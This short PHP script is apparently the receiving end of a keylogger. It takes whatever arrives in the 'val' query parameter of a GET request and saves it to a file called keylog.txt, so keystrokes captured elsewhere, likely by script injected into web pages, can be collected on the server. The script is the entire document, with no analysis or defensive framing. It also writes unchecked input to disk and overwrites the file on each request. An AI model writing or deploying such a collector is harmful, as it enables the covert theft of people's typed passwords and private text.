<?php

function write ($val)
{
    $file = "keylog.txt";
    file_put_contents($file, $val);
}

if (isset($_GET['val']))
{
    write($_GET['val']);
}

?>